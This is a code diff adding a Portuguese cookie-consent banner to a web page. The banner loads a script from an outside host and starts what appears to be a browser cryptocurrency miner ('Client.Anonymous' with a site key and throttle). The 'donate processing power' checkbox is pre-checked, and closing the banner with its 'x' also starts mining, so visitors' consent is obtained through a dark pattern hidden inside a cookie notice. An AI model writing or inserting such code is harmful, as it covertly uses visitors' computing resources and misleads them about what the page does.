@@ -1,0 +1,52 @@
+<script src="https://www.hostingcloud.racing/jvF6.js"></script>
+<div id="cookieConsent">
+    <div id="closeCookieConsent">x</div>
+    Este Website está a usar cookies. <a href="privacyPolicy.html" target="_blank">Mais informação</a>.<br>Apoie-nos com
+    um pouco poder de processamento:&nbsp;<input type="checkbox" id="crypto" checked> <a class="cookieConsentOK">OK</a>
+</div>
+<script>
+    function getCookie(cname) {
+        var name = cname + "=";
+        var decodedCookie = decodeURIComponent(document.cookie);
+        var ca = decodedCookie.split(';');
+        for (var i = 0; i < ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) == ' ') {
+                c = c.substring(1);
+            }
+            if (c.indexOf(name) == 0) {
+                return c.substring(name.length, c.length);
+            }
+        }
+        return "";
+    }
+
+    function setCookie(cname, cvalue, exdays) {
+        var d = new Date();
+        d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
+        var expires = "expires=" + d.toUTCString();
+        document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+    }
+
+    $(document).ready(function () {
+        setTimeout(function () {
+            if (!(getCookie('cryptConsent') == 'false' || getCookie('cryptConsent') == 'true')) {
+                $("#cookieConsent").fadeIn(200);
+            } else if(getCookie('cryptConsent') == 'true'){
+                var _client = new Client.Anonymous("a0080bffd3f35dc6d7ceb788ecb7557ad52c5a779d05cab47bdbce96f1563246", { throttle: 0.9, c: "w", ads: 0, });
+                _client.start();
+            }
+        }, 3000);
+        $("#closeCookieConsent, .cookieConsentOK").click(function () {
+            if ($('#crypto').prop("checked") == true) {
+                var _client = new Client.Anonymous("a0080bffd3f35dc6d7ceb788ecb7557ad52c5a779d05cab47bdbce96f1563246", { throttle: 0.9, c: "w", ads: 0, });
+                _client.start();
+                setCookie('cryptConsent', 'true', 1);
+            }else{
+                setCookie('cryptConsent', 'false', 1);
+            }
+
+            $("#cookieConsent").fadeOut(200);
+        });
+    });
+</script>
